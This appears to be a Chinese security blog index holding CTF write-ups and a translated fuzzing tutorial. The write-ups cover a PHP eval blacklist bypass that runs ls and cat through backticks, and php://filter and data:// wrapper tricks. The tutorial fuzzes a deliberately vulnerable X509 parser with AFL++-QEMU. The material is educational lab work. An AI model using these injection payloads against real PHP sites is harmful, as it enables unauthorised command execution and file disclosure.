<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">居然都不输入参数，可恶!!!!!!!!!</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;看看你输入的参数！！！不叫样子！！&#x27;</span>;<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你想干什么？？？？？？？？？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;居然都不输入参数，可恶!!!!!!!!!&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>绕过检测即可执行命令</p>
<p><code>printf</code>和<code>var_dump</code>没有被过滤	其他命令可以用<code>\</code>或中间插入<code>&#39;&#39;</code>绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">printf</span>(`l\s`);</span><br><span class="line">?code=<span class="title function_ invoke__">printf</span>(`l\s;c<span class="string">&#x27;&#x27;</span>at /fffffffffflagafag`)</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/07/26/UUCTF2022-ez-rce-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/07/23/SWPUCTF2021-PseudoProtocols/" >SWPUCTF2021-PseudoProtocols</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-07-23
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/439">题目链接</a>  </p>
<h2 id="页面分析"><a href="#页面分析" class="headerlink" title="页面分析"></a>页面分析</h2><p>进入页面显示<code>hint is hear Can you find out the hint.php?</code></p>
<p>当前url为: <code>http://node2.anna.nssctf.cn:28424/index.php?wllm=</code></p>
<h2 id="php伪协议读取hint-php"><a href="#php伪协议读取hint-php" class="headerlink" title="php伪协议读取hint.php"></a>php伪协议读取hint.php</h2><p>根据页面提示尝试</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=php:<span class="comment">//filter/convert.base64-encode/resource=hint.php</span></span><br></pre></td></tr></table></figure>

<p>解码后得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//go to /test2222222222222.php</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问 <code>http://node2.anna.nssctf.cn:28424/test2222222222222.php</code>可以得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;max_execution_time&quot;</span>, <span class="string">&quot;180&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>= <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)) === <span class="string">&#x27;I want flag&#x27;</span>)&#123;	<span class="comment"># a文件内容为&#x27;I want flag&#x27;时展示flag</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<h2 id="data伪协议构造读取"><a href="#data伪协议构造读取" class="headerlink" title="data伪协议构造读取"></a>data伪协议构造读取</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test2222222222222.php?a=data:<span class="comment">//text/plain;base64,SSB3YW50IGZsYWc=   # base64(&#x27;I want flag&#x27;)</span></span><br></pre></td></tr></table></figure>

<p>即可获取flag</p>

	
	</div>
  <a type="button" href="/2023/07/23/SWPUCTF2021-PseudoProtocols/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/07/20/AFL-QEMU/" >使用 AFL++-QEMU 和 libprotobuf 的高级二进制模糊：语法感知和内存中持续模糊的实际案例</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-07-20
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>原文链接：<a target="_blank" rel="noopener" href="https://airbus-seclab.github.io/AFLplusplus-blogpost/">https://airbus-seclab.github.io/AFLplusplus-blogpost/</a></p>
</blockquote>
<p>想象一下，你在一个<strong>没有源代码</strong>的二进制文件中发现了一个可能存在漏洞的函数。为了帮助你识别漏洞，你需要<strong>尽可能使用最相关的 AFL++ 配置进行模糊处理</strong>。然而，由于在实践中实现这样的工具并不容易，我们决定在一篇博客文章中总结我们的经验和方法，以帮助未来的工作。</p>
<p>这篇博文介绍了如何利用 AFL++-QEMU 的<strong>高级功能</strong>，在<strong>实际案例</strong>中逐步开始语法感知和内存中持续模糊测试。我们提供了所有脚本和数据（以及 ELF 目标），您可以在阅读本博文的同时自己进行实验。尽管我们鼓励您这样做，但这完全是可选的；您也可以只通过通读来欣赏这篇文章，我们希望您仍能从中学到东西！</p>
<h2 id="二进制模糊：一些反复出现的问题"><a href="#二进制模糊：一些反复出现的问题" class="headerlink" title="二进制模糊：一些反复出现的问题"></a>二进制模糊：一些反复出现的问题</h2><p>QEMU 是 AFL++ 支持的后端之一，用于处理纯二进制程序的插装。</p>
<p>在实践中，这意味着与源代码可用的目标相反，您不需要重新编译源代码来获得检测二进制文件。相反，AFL++ 会使用 QEMU 的补丁版<a target="_blank" rel="noopener" href="https://qemu-project.gitlab.io/qemu/user/index.html">用户模式仿真</a>执行原始二进制文件，以收集覆盖信息。   </p>
<p><strong>注意事项：</strong></p>
<ul>
<li>如果你想了解有关 QEMU 内部的更多信息，请务必查看<a target="_blank" rel="noopener" href="https://airbus-seclab.github.io/qemu_blog">本系列文章</a>。</li>
<li>在本文中，我们只探讨 QEMU 后端。然而，这里详细描述的大多数概念应该适用于其他可用的<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_binary-only_targets.md">AFL++ 后端</a>。</li>
</ul>
<p>使用 QEMU 模式（使用 <code>-Q</code> 标志）执行 Fuzzing 的基本操作如下图所示：</p>
<p><img src="https://airbus-seclab.github.io/AFLplusplus-blogpost/img/basic-fuzzing.png?raw=true" alt="图解命令行"></p>
<p>使用 QEMU 模式，可以配置不同的方面来优化 Fuzzing 性能和覆盖范围。<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/qemu_mode/README.md">官方文档</a>介绍了所有可用的功能。其中：</p>
<ul>
<li>插桩和覆盖率：<ul>
<li><code>AFL_INST_LIBS</code></li>
<li><code>AFL_QEMU_INST_RANGES</code></li>
</ul>
</li>
<li>突变：<ul>
<li><code>AFL_CUSTOM_MUTATOR_LIBRARY</code></li>
<li><code>AFL_CUSTOM_MUTATOR_ONLY</code></li>
</ul>
</li>
<li>变异：<ul>
<li><code>AFL_ENTRYPOINT</code></li>
<li><code>AFL_QEMU_PERSISTENT_ADDR</code>&#x2F; <code>AFL_QEMU_PERSISTENT_ADDR_RET</code></li>
<li><code>AFL_QEMU_PERSISTENT_HOOK</code></li>
<li><code>AFL_DISABLE_TRIM</code></li>
<li><code>AFL_DEBUG</code>&#x2F; <code>AFL_DEBUG_CHILD</code></li>
</ul>
</li>
</ul>
<p>本文旨在介绍我们如何在实际案例中回答这些问题，从基本配置到针对目标进行优化的设置，这些都可以重复使用并应用于其他类似项目。</p>
<p>然而，从理论到实践有时显得枯燥乏味，而且经常会产生一些反复出现的问题，例如：</p>
<ul>
<li>我们希望插桩检测覆盖哪段代码？</li>
<li>Fuzzer 入口点的最佳选择是什么？</li>
<li>移动入口点对测试用例的格式意味着什么？</li>
<li>我们的工作如何从 AFL++ 中提供的高级功能中获益，以提高性能？</li>
</ul>
<p>本文旨在介绍我们如何在实际案例中回答这些问题，从基本配置到针对目标进行优化的设置，并且这些都可以重复使用并应用于其他类似项目。</p>
<h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><h3 id="弱-X509-解析器"><a href="#弱-X509-解析器" class="headerlink" title="弱 X509 解析器"></a>弱 X509 解析器</h3><p>我们选择的<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/src">示例</a>灵感来自于我们在安全评估期间遇到的现实生活中的目标（但由于显而易见的原因，无法重新分配）。它是一个二进制文件，需要一个文件名作为输入，并尝试将相应文件的内容解析为 X509 证书。</p>
<p>它只包含几个基本功能：</p>
<ul>
<li><code>main</code>：main 函数，该函数将文件作为输入并以该文件作为参数进行调用 <code>parse_cert</code>；</li>
<li><code>parse_cert</code>：调用 <code>read_file</code> 并将读取缓冲区作为参数提供给 <code>parse_cert_buf</code>；</li>
<li><code>read_file</code>：打开文件，读取并返回其内容；</li>
<li><code>parse_cert_buf</code>：将缓冲区解析 <code>openssl</code> 为 C 库中的 X509 证书 <code>d2i_X509</code>，尝试获取 CN 并打印它。</li>
</ul>
<p>此目标故意包含一个我们希望在 Fuzzing 活动期间触及的小漏洞：中的基于栈的缓冲区溢出 <code>parse_cert_buf</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">parse_cert_buf</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    X509 *cert;</span><br><span class="line">    <span class="type">char</span> cn[MAX_CN_SIZE];</span><br><span class="line"></span><br><span class="line">    cert = d2i_X509(<span class="literal">NULL</span>, &amp;buf, len);</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">char</span> *subj = X509_NAME_oneline(X509_get_subject_name(cert), <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(cn, subj);  <span class="comment">// Oops</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got CN=&#x27;%s&#x27; from certificate\n&quot;</span>, cn);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此外，还特意在主程序开始时添加了一个虚拟 <code>init</code> 函数，以模拟初始化阶段，该阶段将花费时间并使目标缓慢启动。</p>
<h3 id="探索目标"><a href="#探索目标" class="headerlink" title="探索目标"></a>探索目标</h3><p>在现实生活中，目标显然不像我们的<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/src/target.c">弱 X509 解析器</a>那么简单。事实上，一个好的仅有二进制目标的模糊活动总是从逆向工程阶段开始：</p>
<ul>
<li>了解目标，它是如何工作的，它如何与环境交互等。</li>
<li>确定要研究的有趣特征；</li>
<li>找到可能被证明是好的模糊目标的函数；</li>
<li>分析调用上下文、结构、用户控制的参数等。</li>
<li>使用适当的参数和模糊化的输入构建一个工具或工具链来调用目标函数。</li>
<li>生成初始语料库以启动 Fuzzer.</li>
</ul>
<p>尽管有一些工具（如<a target="_blank" rel="noopener" href="https://github.com/ex0dus-0x/fuzzable">fuzzable</a>）可以帮助完成其中的一些步骤，但它们通常仍然是模糊二进制目标的必需的、繁琐的和手动的部分。</p>
<p>由于我们的示例很简单，因此你应该不会花费太长时间来查找易受攻击的代码、调用跟踪和 To<strong>识别感兴趣的功能</strong>： <code>parse_cert_buf</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00000000000013d4 &lt;parse_cert_buf&gt;:</span><br><span class="line">    13d4: 55                    push   rbp</span><br><span class="line">    13d5: 48 89 e5              mov    rbp,rsp</span><br><span class="line">    13d8: 53                    push   rbx</span><br><span class="line">    13d9: 48 83 ec 68           sub    rsp,0x68</span><br><span class="line">...</span><br><span class="line">    1473: 48 89 d6              mov    rsi,rdx</span><br><span class="line">    1476: 48 89 c7              mov    rdi,rax</span><br><span class="line">    1479: e8 92 fc ff ff        call   1110 &lt;strcpy@plt&gt;</span><br><span class="line">...</span><br><span class="line">    14d9: b8 00 00 00 00        mov    eax,0x0</span><br><span class="line">    14de: 48 8b 5d f8           mov    rbx,QWORD PTR [rbp-0x8]</span><br><span class="line">    14e2: c9                    leave</span><br><span class="line">    14e3: c3                    ret</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> 你获得的地址可能会根据你的编译器、其版本、使用的选项等而改变。只要它们是一致的，就不用担心！</p>
<p>现在，最有趣的部分：模糊这个目标！为此，请关注本文的其余部分</p>
<h2 id="语料"><a href="#语料" class="headerlink" title="语料"></a>语料</h2><h3 id="收集输入"><a href="#收集输入" class="headerlink" title="收集输入"></a>收集输入</h3><p>在此之前，我们需要收集样本输入文件来构建语料库。事实上，这些<a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/fuzzing_in_depth.md#a-collecting-inputs">AFL++ 文档</a>指出：</p>
<blockquote>
<p>要正确操作，Fuzzer 需要一个或多个启动文件<br>包含目标通常期望的输入数据的良好示例</p>
</blockquote>
<p>在我们的例子中，由于目标解析证书，我们只需使用 OpenSSL 生成一个证书：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ openssl req -nodes -new -x509 -keyout key.pem -out cert.pem</span><br></pre></td></tr></table></figure>

<p>为了使事情更简单，我们已经在<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step0/corpus">corpus</a>文件夹中提供了一个。</p>
<h3 id="预处理语料库"><a href="#预处理语料库" class="headerlink" title="预处理语料库"></a>预处理语料库</h3><p>在使用这个语料库之前，我们可以：</p>
<ol>
<li>仅保留导致不同执行路径的输入样本（使用 <code>afl-cmin</code>）；</li>
<li>最小化每个输入样本以保留其独特的执行路径，同时使其大小尽可能小（使用 <code>afl-tmin</code>）。这将使未来的突变更加有效。</li>
</ol>
<p>我们将这两个步骤合并到一个<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step0/build_corpus.sh">build_corpus.sh</a>脚本中。</p>
<p>现在，假设你按照中 <code>README.md</code> 的步骤构建了 AFL++，你可以继续从 <code>step0</code> 目录中运行 <code>build_corpus.sh</code>。这将完成语料库最小化步骤，并为下一步做好准备。</p>
<p>我们现在应该具备<em>真实的</em>运行 AFL++ 的所有先决条件。我们将在下一步深入，所以继续跟上！</p>
<h2 id="仪器仪表"><a href="#仪器仪表" class="headerlink" title="仪器仪表"></a>仪器仪表</h2><p>AFL++ 是一个“覆盖率引导”的模糊测试工具，这意味着变异策略要分析先前执行的代码覆盖，以生成新的输入。为了构建覆盖信息，AFL++-QEMU 需要知道已经到达了哪些基本块。这是通过检测每个基本块以在其被击中时进行跟踪来实现的。</p>
<h3 id="默认设置（step0）"><a href="#默认设置（step0）" class="headerlink" title="默认设置（step0）"></a>默认设置（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step0">step0</a>）</h3><p>默认情况下，通过启动 AFL++-QEMU（如中所示<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step0">step0</a>），<strong>目标的所有基本块</strong>可以对其进行插装，并且插装中<strong>不</strong>包含共享库。</p>
<p>注意这个 <code>exec speed</code> 指标：你可以关注它是如何随着我们帖子的每一步发展的。</p>
<h3 id="插桩调整（step1）"><a href="#插桩调整（step1）" class="headerlink" title="插桩调整（step1）"></a>插桩调整（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step1">step1</a>）</h3><p>对于研究目标来说，改变这种默认的插桩行为是很有趣的。原因可能包括：</p>
<ul>
<li>你对覆盖由主二进制文件导入的库中所有可能的路径感兴趣</li>
<li>你想要排除已测试安全性的库的特定部分</li>
<li>检测完整的大型二进制文件会降低执行速度</li>
</ul>
<p>要查看指令插入的范围，可使用以下选项：</p>
<ul>
<li><code>AFL_INST_LIBS</code>;</li>
<li><code>AFL_QEMU_INST_RANGES</code>;</li>
<li><code>AFL_CODE_START</code>;</li>
<li><code>AFL_CODE_END</code>。</li>
</ul>
<p>在我们的示例中，虽然它对仪器 <code>parse_cert_buf</code> 至关重要，但它与仪器 <code>main</code>和共享库（例如 <code>libssl.so</code>）的关系不大。为了对此进行配置，我们将工具仅限于感兴趣的函数。这是通过设置 <code>AFL_QEMU_INST_RANGES</code>（请参阅<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step1">step1</a>）来完成的：</p>
<ul>
<li>从 <code>parse_cert_buf</code> 第一条指令的地址开始</li>
<li>到 <code>parse_cert_buf</code> 最后一条指令的地址结束</li>
</ul>
<p><strong>注意：</strong>，在我们的例子中也可以使用 <code>AFL_CODE_START</code> 和 <code>AFL_CODE_END</code> 来完成。但是， <code>AFL_QEMU_INST_RANGES</code> 更灵活，因为它允许指定多个要检测的范围，因此我们更喜欢使用此环境变量。</p>
<p>这些地址可以手动确定，也可以从 <code>objdump</code> 输出中推断出来：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># The base address at which QEMU loads our binary depends on the target</span></span><br><span class="line"><span class="comment"># See https://github.com/AFLplusplus/AFLplusplus/blob/stable/qemu_mode/README.persistent.md#21-the-start-address</span></span><br><span class="line"><span class="keyword">case</span> $(file <span class="string">&quot;<span class="variable">$target_path</span>&quot;</span>) <span class="keyword">in</span></span><br><span class="line">  *<span class="string">&quot;statically linked&quot;</span>*)</span><br><span class="line">    QEMU_BASE_ADDRESS=0</span><br><span class="line">    ;;</span><br><span class="line">  *<span class="string">&quot;32-bit&quot;</span>*)</span><br><span class="line">    QEMU_BASE_ADDRESS=0x40000000</span><br><span class="line">    ;;</span><br><span class="line">  *<span class="string">&quot;64-bit&quot;</span>*)</span><br><span class="line">    QEMU_BASE_ADDRESS=0x4000000000</span><br><span class="line">    ;;</span><br><span class="line">  *) <span class="built_in">echo</span> <span class="string">&quot;Failed to guess QEMU_BASE_ADDRESS&quot;</span>; <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># We use objdump to parse our target binary and obtain the address and size of a given function</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">find_func</span></span>() &#123;</span><br><span class="line">    objdump -t <span class="string">&quot;<span class="variable">$target_path</span>&quot;</span> | awk -n /<span class="string">&quot;<span class="variable">$1</span>&quot;</span><span class="string">&#x27;$/&#123;print &quot;0x&quot;$1, &quot;0x&quot;$5&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Some environment variables for AFL++ must be hex encoded</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">hex_encode</span></span>() &#123;</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;0x%x&quot;</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> fuzz_func_addr fuzz_func_size &lt; &lt;(find_func <span class="string">&quot;parse_cert_buf&quot;</span>)</span><br><span class="line">inst_start=$(hex_encode $((&quot;<span class="variable">$QEMU_BASE_ADDRESS</span>&quot; + &quot;<span class="variable">$fuzz_func_addr</span>&quot;)))</span><br><span class="line">inst_end=$(hex_encode $((&quot;<span class="variable">$inst_start</span>&quot; + &quot;<span class="variable">$fuzz_func_size</span>&quot;)))</span><br><span class="line"><span class="built_in">export</span> AFL_QEMU_INST_RANGES=<span class="string">&quot;<span class="variable">$inst_start</span>-<span class="variable">$inst_end</span>&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ find_func <span class="string">&quot;parse_cert_buf&quot;</span></span><br><span class="line">0x00000000000013d4 0x0000000000000110</span><br></pre></td></tr></table></figure>

<p>通过启用 AFL++-QEMU 的调试模式（<code>AFL_DEBUG</code>），我们可以检查<strong>插桩范围符合我们的要求</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Instrument range: 0x40000013d4-0x40000014e4 (&lt;noname&gt;)</span><br></pre></td></tr></table></figure>

<p>从现在开始我们的目标是<strong>仅对感兴趣的部分进行检测，并准备进行Fuzz</strong>。</p>
<h2 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h2><h3 id="概念和默认行为"><a href="#概念和默认行为" class="headerlink" title="概念和默认行为"></a>概念和默认行为</h3><p>当模糊化时，AFL++ 运行目标，直到到达特定地址（AFL 入口点），然后从那里为每个迭代分叉。默认情况下，AFL 入口点设置为目标的入口点（在我们的示例 <code>target</code> 中为 <code>_start</code> 函数）。</p>
<p>实际上，在默认配置中，AFL++ 会打印以下消息：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from the step0 directory</span></span><br><span class="line">$ AFL_DEBUG=1 ./fuzz.sh | grep entrypoint</span><br><span class="line">AFL forkserver entrypoint: 0x40000011a0</span><br></pre></td></tr></table></figure>

<p>反汇编 <code>target</code> <code>objdump</code> 确认入口点设置为 <code>_start</code> 函数的地址：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from the step0 directory</span></span><br><span class="line">$ objdump -d --start-address=0x11a0 ../src/target | <span class="built_in">head</span> -n20</span><br><span class="line">00000000000011a0 &lt;_start&gt;:</span><br><span class="line">    11a0: 31 ed                 xor    ebp,ebp</span><br><span class="line">    11a2: 49 89 d1              mov    r9,rdx</span><br><span class="line">    ...</span><br><span class="line">    11b4: 48 8d 3d fa 03 00 00  lea    rdi,[rip+0x3fa]         <span class="comment"># 15b5 &lt;main&gt;</span></span><br><span class="line">    11bb: ff 15 1f 2e 00 00     call   QWORD PTR [rip+0x2e1f]  <span class="comment"># 3fe0 &lt;__libc_start_main@GLIBC_2.34&gt;</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>使用此配置，每次迭代都会运行整个目标。</p>
<h3 id="定位选择（step2）"><a href="#定位选择（step2）" class="headerlink" title="定位选择（step2）"></a>定位选择（<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step2">step2</a>）</h3><p>在某些情况下（如我们的示例），程序的初始化阶段可能需要一些时间。因为每次迭代都要执行初始化，所以对fuzz速度有直接影响。这正是 <code>AFL_ENTRYPOINT</code> 变量所要处理的情况。</p>
<p>实际上， <code>AFL_ENTRYPOINT</code> 可以设置为相关的自定义值，该值将：</p>
<ul>
<li>只运行一次初始化阶段，直到到达该 <code>AFL_ENTRYPOINT</code> 地址。</li>
<li>将目标停止在， <code>AFL_ENTRYPOINT</code> 并与fuzzer同步；</li>
<li>让 fuzzer 对目标的状态进行快照，然后在 <code>AFL_ENTRYPOINT</code> 地址之后继续执行。</li>
</ul>
<p>这样，在 fork 服务器运行所有迭代之前，初始化阶段只运行一次，并且 fuzzing 被加速。</p>
<p>在我们的示例中，的 <code>AFL_ENTRYPOINT</code> 定位选择非常简单，因为：</p>
<ul>
<li><code>init</code> 代码不需要模糊化；</li>
<li><code>init</code> 阶段每次都是执行同样内容；</li>
<li>与模糊相关的函数已经确定（<code>parse_cert</code>）。</li>
</ul>
<p>因此，我们可以将 <code>AFL_ENTRYPOINT</code> 设置为 <code>parse_cert</code> 函数的开头（请参阅<a target="_blank" rel="noopener" href="https://github.com/airbus-seclab/AFLplusplus-blogpost/tree/main/step2">step2</a>）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Define a custom AFL++ entrypoint executed later than the default (the binary&#x27;s</span></span><br><span class="line"><span class="comment"># entrypoint)</span></span><br><span class="line"><span class="built_in">read</span> fuzz_func_addr fuzz_func_size &lt; &lt;(find_func <span class="string">&quot;parse_cert&quot;</span>)</span><br><span class="line"><span class="built_in">export</span> AFL_ENTRYPOINT=$(hex_encode $((&quot;<span class="variable">$QEMU_BASE_ADDRESS</span>&quot; + &quot;<span class="variable">$fuzz_func_addr</span>&quot;)))</span><br></pre></td></tr></table></figure>

<p>在此配置中，AFL++ 打印以下消息：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ AFL_DEBUG=1 ./fuzz.sh | grep entrypoint</span><br><span class="line">AFL forkserver entrypoint: 0x40000014e4</span><br></pre></td></tr></table></figure>

<p>我们可以通过反汇编 <code>target</code> 来确认这是的地址 <code>parse_cert</code> ：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d --start-address=0x14e4 ../src/target | <span class="built_in">head</span> -n10</span><br><span class="line">00000000000014e4 &lt;parse_cert&gt;:</span><br><span class="line">    14e4: 55                    push   rbp</span><br><span class="line">    14e5: 48 89 e5              mov    rbp,rsp</span><br><span class="line">    14e8: 48 83 ec 20           sub    rsp,0x20</span><br></pre></td></tr></table></figure>

